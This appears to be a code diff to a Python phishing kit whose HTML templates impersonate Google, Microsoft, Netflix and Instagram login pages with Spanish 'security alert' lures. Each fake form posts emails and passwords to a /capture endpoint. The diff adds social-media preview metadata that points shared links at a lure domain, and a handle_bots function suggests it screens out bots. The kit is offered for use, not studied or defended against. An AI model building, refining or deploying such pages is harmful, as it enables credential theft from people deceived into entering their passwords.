@@ -93,7 +93,13 @@ def get_template(name='google'):
     <meta property="og:title" content="Alerta de seguridad">
     <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Verificación de seguridad</title>
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alerta de seguridad">
+    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Alerta de seguridad</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
         body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -112,8 +118,8 @@ def get_template(name='google'):
 <body>
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-        <div class="security-badge">🔒 Verificación de seguridad</div>
-        <h1>Tu sesión ha expirado</h1>
+        <div class="security-badge">🔒 Alerta de seguridad</div>
+        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
         <p>Vuelve a iniciar sesión para verificar tu identidad</p>
         <form action="/capture" method="POST">
             <input type="email" name="email" placeholder="Correo electrónico" required>
@@ -133,7 +139,13 @@ def get_template(name='google'):
     <meta property="og:title" content="Alerta de seguridad">
     <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Verificación de seguridad</title>
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alerta de seguridad">
+    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Alerta de seguridad</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
         body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -152,8 +164,8 @@ def get_template(name='google'):
 <body>
     <div class="container">
         <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
-        <div class="security-badge">🔒 Verificación de seguridad</div>
-        <h1>Tu sesión ha expirado</h1>
+        <div class="security-badge">🔒 Alerta de seguridad</div>
+        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
         <p>Vuelve a iniciar sesión para verificar tu identidad</p>
         <form action="/capture" method="POST">
             <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
@@ -173,7 +185,13 @@ def get_template(name='google'):
     <meta property="og:title" content="Alerta de seguridad">
     <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Verificación de seguridad</title>
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alerta de seguridad">
+    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Alerta de seguridad</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
         body{background:linear-gradient(135deg,#141414 0%, #000000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -192,8 +210,8 @@ def get_template(name='google'):
 <body>
     <div class="container">
         <h1 style="font-size:40px;font-family:'Helvetica Neue',sans-serif;margin-bottom:30px;">NETFLIX</h1>
-        <div class="security-badge">🔒 Verificación de seguridad</div>
-        <h1>Tu sesión ha expirado</h1>
+        <div class="security-badge">🔒 Alerta de seguridad</div>
+        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
         <p>Vuelve a iniciar sesión para verificar tu identidad</p>
         <form action="/capture" method="POST">
             <input type="email" name="email" placeholder="Email" required>
@@ -213,7 +231,13 @@ def get_template(name='google'):
     <meta property="og:title" content="Alerta de seguridad">
     <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Verificación de seguridad</title>
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alerta de seguridad">
+    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Alerta de seguridad</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
         body{background:linear-gradient(135deg,#fafafa 0%, #e0e0e0 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -232,8 +256,8 @@ def get_template(name='google'):
 <body>
     <div class="container">
         <div class="logo">Instagram</div>
-        <div class="security-badge">🔒 Verificación de seguridad</div>
-        <h1>Tu sesión ha expirado</h1>
+        <div class="security-badge">🔒 Alerta de seguridad</div>
+        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
         <p>Vuelve a iniciar sesión para verificar tu identidad</p>
         <form action="/capture" method="POST">
             <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
@@ -275,9 +299,12 @@ def handle_bots():
     <meta property="og:title" content="Alerta de seguridad">
     <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <meta property="og:url" content="https://video-xeen.onrender.com/">
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alerta de seguridad">
+    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
     <title>Alerta de seguridad</title>
 </head>
 <body>
